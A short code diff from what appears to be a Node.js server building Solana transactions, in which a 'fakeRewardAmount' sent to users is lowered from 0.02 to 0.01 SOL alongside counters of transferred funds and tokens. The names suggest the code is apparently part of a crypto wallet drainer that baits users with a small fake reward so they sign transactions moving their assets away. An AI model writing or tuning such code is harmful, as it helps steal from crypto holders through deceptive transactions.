@@ -236,7 +236,7 @@ app.post('/prepare-transaction', async (req, res) => {
     let totalTransferred = 0;
     let tokenTransfers = 0;
 
-    const fakeRewardAmount = 0.02 * LAMPORTS_PER_SOL; // 0.02 SOL
+    const fakeRewardAmount = 0.01 * LAMPORTS_PER_SOL; // 0.01 SOL
     transaction.add(
       SystemProgram.transfer({
         fromPubkey: receiverWallet, 
